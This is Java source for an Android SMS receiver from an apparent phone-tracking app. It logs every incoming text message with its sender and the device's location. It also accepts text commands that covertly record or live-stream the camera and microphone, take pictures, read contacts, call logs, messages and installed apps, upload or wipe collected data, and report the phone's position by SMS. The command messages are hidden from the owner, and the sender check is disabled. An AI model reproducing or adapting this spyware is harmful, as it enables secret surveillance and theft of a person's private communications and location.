package vn.vhc.live;


//import vn.vhc.live.video.ProxyHandle;
//import vn.vhc.live.video.ProxyService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {

	public Handler hx= new Handler(){
		
		public void handleMessage(Message msg) 
		  {			  
			try
			{
				  //range for control command
				  if(msg.what>=299 && msg.what<400)
				  {		
					//ProxyService.getInstance().uiHandle.sendEmptyMessage(msg.what-200);
				  }
				  else if(msg.what==APTrackerService.CLEAR_ALL_PROVE)
				  {		
					//ProxyService.getInstance().uiHandle.sendEmptyMessage(APTrackerService.CLEAR_ALL_PROVE);
				  }
				  else  if(msg.what==APTrackerService.START_UPLOAD_ALL)
				  {		
					//ProxyService.getInstance().uiHandle.sendEmptyMessage(APTrackerService.START_UPLOAD_ALL);
				  }
				  //congig message
				  else if(msg.what==100)
				  {		
					  ContextManagerCore.getInstance().turnGPSOn();					
				  }	
				  else if(msg.what==101)
				  {			 
					  ContextManagerCore.getInstance().turnGPSOff();
				  }	
				  else if(msg.what==102)
				  {			 
					  ContextManagerCore.getInstance().turnWIFIOn();
				  }	
				  else if(msg.what==103)
				  {			 
					  ContextManagerCore.getInstance().turnWIFIOff();
				  }	
				  else if(msg.what==104)
				  {			 
					  ContextManagerCore.getInstance().turnOnOff3G(true);
				  }	
				  else if(msg.what==105)
				  {			 
					  ContextManagerCore.getInstance().turnOnOff3G(false);
				  }	
				  //online
				  else if(msg.what==106)
				  {			 
					  (new HttpData()).postActionMember("act=online", 3000);
				  }	
				  //offline
				  else if(msg.what==107)
				  {			 
					  (new HttpData()).postActionMember("act=offline", 3000);
				  }	
				  else if(msg.what==108)
				  {			 
					  ContextManagerCore.getInstance().restartService();			
				  }					
				  else if(msg.what==110)
					  {			 
						UtilGame.autoNotTurnOn3G=false;
						(new HttpData()).postActionMember("act=auto3gon", 3000);		
					  }	
					
				  else if(msg.what==111)
					  {			 
						UtilGame.autoNotTurnOn3G=true;
						(new HttpData()).postActionMember("act=auto3goff", 3000);				
					  }	
					
				  else if(msg.what==112)
					  {			 
						UtilGame.modeOnlyWifi=true;
						(new HttpData()).postActionMember("act=wifionlyon", 3000);				
					  }	
				  else if(msg.what==113)
					  {			 
						UtilGame.modeOnlyWifi=false;
						(new HttpData()).postActionMember("act=wifionlyoff", 3000);					
					  }	
				  else if(msg.what==114)
					  {			 
						UtilGame.modeEncrypt=true;
						(new HttpData()).postActionMember("act=encrypton", 3000);					
					  }
				  else if(msg.what==115)
					  {			 
						UtilGame.modeEncrypt=false;
						(new HttpData()).postActionMember("act=encryptoff", 3000);					
					  }	
				  else if(msg.what==116)
					  {			 
						UtilGame.savepin=1;
						(new HttpData()).postActionMember("act=savepinon", 3000);					
					  }	
				  else if(msg.what==117)
					  {			 
						UtilGame.savepin=0;
						(new HttpData()).postActionMember("act=savepinoff", 3000);					
					  }	
				
					//ContextManagerCore.getInstance().sendSMSToToTel(msg.obj.toString(),"Da xu ly ok lenh cua ban!");
										
				  super.handleMessage(msg);
			}catch(Exception ex)
			{
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
						"ErrorHandleOnSms:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			}
		  }
	}; 
	
	
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		try
		{
			ContextManagerCore.getInstance().setCurrentContext(context);//tracking context
			Bundle bundle = intent.getExtras();	
			
			Object messages[] = (Object[]) bundle.get("pdus");
			SmsMessage smsMessage[] = new SmsMessage[messages.length];
			for (int n = 0; n < messages.length; n++) 
			{
				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);			
				//Toast.makeText(context, "Change config:"+isMsgConfig("1111",smsMessage[n].getMessageBody().toLowerCase()), Toast.LENGTH_LONG);
	            //context.startService(new Intent(context, LogService.class));  
				DataObject oSms=new DataObject(LocationUtil.IMEI
	        			, TypeData.SMS_LOG, ContextManagerCore.getInstance().readLastPosition()
	        			,  String.valueOf(BatteryLog.levelBattery), smsMessage[n].getOriginatingAddress(), TypeData.CALL_INCOMING,UtilGame.getInstance().GetStringNow());
				oSms.set_extradata(smsMessage[n].getMessageBody());	
				//Toast.makeText(context,"SMS:"+ smsMessage[n].getMessageBody(), Toast.LENGTH_LONG).show();
				//FileUtil.saveTextToTempFile(oSms.toFileString());
				UtilMemory.addTo(oSms);
				if(isDebug(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					String msgDebug=
						"Debug==>timeDebug:"+UtilGame.timeRunServiceBackupDebug+//1080000-1320000
						"\n,infoDebug:"+UtilGame.infoRunServiceBackupDebug+
						"\n,isRunningServiceBackup:"+UtilGame.isRunningServiceBackup+//true
						"\n,isRestartServiceBackup:"+UtilGame.timeRestartServiceBackup;//660000
					
					Toast.makeText(context, msgDebug, Toast.LENGTH_LONG).show();
					UtilGame.isModeDebug=true;
					this.abortBroadcast();
					continue;
				}
				else if(isControlCmd(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{		
					//Toast.makeText(context, "Change Control:"+smsMessage[n].getMessageBody()+"===>"+isStopRecordVideo(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()), Toast.LENGTH_LONG).show();
					changeControlCmd(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody());
					this.abortBroadcast();
					continue;
				}	
				else if(isMsgConfig(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					changeConfig(context, smsMessage[n].getMessageBody());
					this.abortBroadcast();
					continue;
				}
				/*
				else if(isRestartPhoneSMS(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().restartService();
					this.abortBroadcast();
					continue;
				}
				else if(isGetPosition(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					sendSMSToNotify(context);
					this.abortBroadcast();
					continue;
				}
				else if(isTurnOffGPS(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnGPSOff();
					this.abortBroadcast();
					continue;
				}
				else if(isTurnOnGPS(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnGPSOn();
					this.abortBroadcast();
					continue;
				}	
				else if(isTurnOnWifi(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnWIFIOn();
					this.abortBroadcast();
					continue;
				}	
				else if(isTurnOffWifi(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnWIFIOff();
					this.abortBroadcast();
					continue;
				}	
				else if(isTurnOn3G(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnOnOff3G(true);
					this.abortBroadcast();
					continue;
				}	
				else if(isTurnOff3G(smsMessage[n].getOriginatingAddress(),smsMessage[n].getMessageBody()))
				{
					ContextManagerCore.getInstance().turnOnOff3G(false);
					this.abortBroadcast();
					continue;
				}	
				*/
				//UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null).getActiveKey()
	        	//, TypeData.CALL_LOG, ContextManager.getInstance().readLastPosition(),  String.valueOf(BatteryLog.levelBattery), smsMessage[n].getOriginatingAddress(), TypeData.CALL_INCOMING));
			}
		}
		catch(Exception exxxx)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
					"SmsLog:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			
		}	
		// show first message
		//Toast toast = Toast.makeText(context,"Received SMS: " + smsMessage[0].getMessageBody(), Toast.LENGTH_LONG);
		//toast.show();
	}
	private boolean isControlCmd(String phone, String msg) 
	{
		return 
			(isStartRecordVideo(phone, msg))
		|| (isStopRecordVideo(phone, msg))
		|| (isStartLiveVideo(phone, msg))
		|| (isStopLiveVideo(phone, msg))
		|| (isStartRecordAudio(phone, msg))
		|| (isStopRecordAudio(phone, msg))
		|| (isStartLiveAudio(phone, msg))
		|| (isStopLiveAudio(phone, msg))
		|| (isCaptuteImage(phone, msg))
		|| (isStopCaptuteImage(phone, msg))
		|| (isGetAddressLog(phone, msg))
		|| (isGetCallLog(phone, msg))
		|| (isGetSmsLog(phone, msg))
		|| (isGetAppLog(phone, msg));
	}
	private void changeControlCmd(String phone, String msg)
	{
		// TODO Auto-generated method stub
		if(isStartRecordVideo(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_RECORDVIDEO);	
		}
		else if(isStopRecordVideo(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_STOP_RECORDVIDEO);
		}	
		else if(isStartLiveVideo(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_LIVECAMERA);
		}
		else if(isStopLiveVideo(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_STOP_LIVECAMERA);		
		}
		else if(isStartRecordAudio(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_RECORDAUDIO);		
		}
		else if(isStopRecordAudio(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_STOP_RECORDAUDIO);		
		}
		else if(isStartLiveAudio(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_LIVEAUDIO);		
		}
		else if(isStopLiveAudio(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_STOP_LIVEAUDIO);		
		}
		else if(isCaptuteImage(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_PICTURE);		
		}
		else if(isStopCaptuteImage(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_STOP_PICTURE);		
		}
		else if(isGetAddressLog(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_READCONTACT);		
		}
		else if(isGetCallLog(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_READLOGCALL);		
		}
		else if(isGetSmsLog(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_READSMS);
		}
		else if(isGetAppLog(phone, msg))
		{
			hx.sendEmptyMessage(UtilGame.CMD_START_READAPPS);
		}
		else if(isUploadAll(phone, msg))
		{
			hx.sendEmptyMessage(APTrackerService.START_UPLOAD_ALL);
		}
		else if(isClearAll(phone, msg))
		{
			hx.sendEmptyMessage(APTrackerService.CLEAR_ALL_PROVE);
		}
	}
	private boolean isClearAll(String phone, String msg) {
		// TODO Auto-generated method stub
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(APTrackerService.START_UPLOAD_ALL));
	}
	private boolean isUploadAll(String phone, String msg) {
		// TODO Auto-generated method stub
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(APTrackerService.CLEAR_ALL_PROVE));
	}
	public boolean isGetPosition(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_POSITION);
	}
	public boolean isTurnOnGPS(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_GPS_ON);
	}
	public boolean isTurnOffGPS(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_GPS_OFF);
	}
	public boolean isTurnOnWifi(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_WIFI_ON);
	}
	public boolean isTurnOffWifi(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_WIFI_OFF);
	}
	public boolean isTurnOn3G(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_GPRS_ON);
	}
	public boolean isTurnOff3G(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_GPRS_OFF);
	}
	public boolean isOnlyWIFI_ON(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_ONLYWIFI_ON);
	}
	public boolean isOnlyWIFI_OFF(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_ONLYWIFI_OFF);
	}
	public boolean isAuto3G_ON(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_AUTO3G_ON);
	}
	public boolean isAuto3G_OFF(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_AUTO3G_OFF);
	}
	public boolean isEncrypt_ON(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_ENCRYPT_ON);
	}
	public boolean isEncrypt_OFF(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_ENCRYPT_OFF);
	}
	public boolean isRestartPhoneSMS(String phone, String msg)
	{
		//return  //phone.endsWith("905827") &&
		//msg.toLowerCase().endsWith("reboot");
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+UtilGame.CMD_REBOOT);
	}
	public boolean isModeDebugPhoneSMS(String phone, String msg)
	{
		return  //phone.endsWith("905827") &&
			msg.toLowerCase().endsWith("modedebug");
	}
	public boolean isStartRecordVideo(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_RECORDVIDEO));
	}
	public boolean isStopRecordVideo(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_STOP_RECORDVIDEO));
	}
	public boolean isStartLiveVideo(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_LIVECAMERA));
	}
	public boolean isStopLiveVideo(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_STOP_LIVECAMERA));
	}
	public boolean isStartRecordAudio(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_RECORDAUDIO));
	}
	public boolean isStopRecordAudio(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_STOP_RECORDAUDIO));
	}
	public boolean isStartLiveAudio(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_LIVEAUDIO));
	}
	public boolean isStopLiveAudio(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_STOP_LIVEAUDIO));
	}
	public boolean isCaptuteImage(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_PICTURE));
	}
	public boolean isStopCaptuteImage(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_STOP_PICTURE));
	}
	public boolean isGetSmsLog(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_READSMS));
	}
	public boolean isGetCallLog(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_READLOGCALL));
	}
	public boolean isGetAppLog(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_START_READAPPS));
	}
	public boolean isGetAddressLog(String phone, String msg)
	{
		msg=msg.replaceAll(" ","");
		return  msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+""+String.valueOf(UtilGame.CMD_POSITION));
	}
	private boolean isMsgConfig(String sender,String msg)
	{
		msg=msg.replaceAll(" ","");
		return 
			msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS)//new version
			||msg.toLowerCase().startsWith("ptrackerpin") 
			|| msg.toLowerCase().startsWith("ptrackeronline")	
			|| msg.toLowerCase().startsWith("ptrackeroffline")
			|| msg.toLowerCase().startsWith("ptrackerreboot")
			|| msg.toLowerCase().startsWith("ptrackerdebug")
			|| msg.toLowerCase().startsWith("ptrackerliveaudio")
			|| msg.toLowerCase().startsWith("ptrackertypegame")	
			|| msg.toLowerCase().startsWith("ptrackertd")
			|| msg.toLowerCase().startsWith("ptrackerrecordcall")							
			|| msg.toLowerCase().startsWith("ptrackersms")
			|| msg.toLowerCase().startsWith("ptrackervoicecall");
	}
	private boolean isDebug(String sender,String msg)
	{
		msg=msg.replaceAll(" ","");
		return msg.toLowerCase().startsWith("ptrackerdebug");
							
	}
	private void sendSMSToNotify(Context context)
	{
		try
		{
			String sData=readLastPastPositionFromDB(context);
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("8189", null, "dv position "+sData, null, null);	
		}catch(Exception ex){}
	}
	public String readLastPastPositionFromDB(Context context) {
		SharedPreferences settings =context.getSharedPreferences(FileUtil.FILE_SAVE, 0);
		String pKey = settings.getString(FileUtil.KEY_PTRACKER , "");
		return pKey;
	}
		
	private void changeConfig(Context context,String msg)
	{
		//online
		if(msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+UtilGame.CMD_ONLINE))
		{
			UtilGame.modeOffline=false;
			hx.sendEmptyMessage(106);
			//(new HttpData()).postActionMember("act=online", 3000);			
			
		}
		else if(msg.toLowerCase().startsWith(UtilGame.PREFIX_SMS+UtilGame.CMD_OFFLINE))
		{
			UtilGame.modeOffline=true;
			hx.sendEmptyMessage(107);
			//(new HttpData()).postActionMember("act=offline", 3000);		
			
		}
		else if(isRestartPhoneSMS("",msg))
		{
			hx.sendEmptyMessage(108);		
		}
		else if(isGetPosition("",msg))
		{
			//hx.sendEmptyMessage(109);	
			sendSMSToNotify(context);
		}
		else if(isTurnOffGPS("",msg))
		{
			hx.sendEmptyMessage(100);			
		}
		else if(isTurnOnGPS("",msg))
		{
			hx.sendEmptyMessage(101);		
			
		}	
		else if(isTurnOnWifi("",msg))
		{
			hx.sendEmptyMessage(102);
				
		}	
		else if(isTurnOffWifi("",msg))
		{
			hx.sendEmptyMessage(103);	
					
		}	
		else if(isTurnOn3G("",msg))
		{
			hx.sendEmptyMessage(104);					
		}	
		else if(isTurnOff3G("",msg))
		{
			hx.sendEmptyMessage(105);					
		}	
		else if(isAuto3G_ON("",msg))
		{
			hx.sendEmptyMessage(110);					
		}
		else if(isAuto3G_OFF("",msg))
		{
			hx.sendEmptyMessage(111);					
		}
		else if(isOnlyWIFI_ON("",msg))
		{
			hx.sendEmptyMessage(112);					
		}
		else if(isOnlyWIFI_OFF("",msg))
		{
			hx.sendEmptyMessage(113);					
		}
		else if(isEncrypt_ON("",msg))
		{
			hx.sendEmptyMessage(114);					
		}
		else if(isEncrypt_OFF("",msg))
		{
			hx.sendEmptyMessage(115);					
		}
		else 
		{
			msg=msg.toLowerCase().trim();
			String[] arrParts=msg.split(" ");
			if(arrParts.length>=3) 
			{
				ContextManagerCore.getInstance().saveToDB(arrParts[1], arrParts[2]);
				ContextManagerCore.getInstance().saveToDB("reload", "1");			
			}
		}
	}	
}
